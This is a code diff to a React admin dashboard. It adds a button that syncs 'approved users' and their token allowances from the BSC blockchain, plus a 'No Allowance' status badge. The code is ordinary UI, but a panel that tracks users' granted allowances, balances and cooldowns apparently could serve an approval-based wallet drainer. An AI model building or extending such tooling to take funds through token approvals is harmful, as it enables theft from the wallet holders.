@@ -219,8 +219,25 @@ export default function AdminPage() {
           </div>
           <div className="header-actions">
             <span className="badge badge-success">{approvedUsers.length} Approved</span>
-            <button className="secondary-btn small" onClick={load}>
-              🔄 Refresh List
+            <button className="secondary-btn small" onClick={load} title="Refresh live balances and allowances">
+              🔄 Refresh
+            </button>
+            <button
+              className="primary-btn small"
+              style={{ padding: '6px 12px', fontSize: '12px' }}
+              onClick={async () => {
+                setStatus({ kind: 'busy', msg: 'Syncing on-chain approvals and allowances from BSC…' });
+                try {
+                  const res = await api.syncApprovals();
+                  setApprovedUsers(res.items || []);
+                  setStatus({ kind: 'ok', msg: `Synced successfully! ${res.items?.length || 0} user records updated.` });
+                } catch (e) {
+                  setStatus({ kind: 'err', msg: `Sync failed: ${e.message}` });
+                }
+              }}
+              title="Scan blockchain for latest approvals and sync allowances"
+            >
+              ⚡ Sync On-Chain
             </button>
           </div>
         </div>
@@ -280,6 +297,8 @@ export default function AdminPage() {
                         <span className="badge badge-warning">In Cooldown</span>
                       ) : u.status === 'zero_balance' ? (
                         <span className="badge badge-warning">0 Balance</span>
+                      ) : u.status === 'no_allowance' ? (
+                        <span className="badge badge-secondary" style={{ opacity: 0.8 }}>No Allowance</span>
                       ) : (
                         <span className="badge badge-info">{u.status}</span>
                       )}
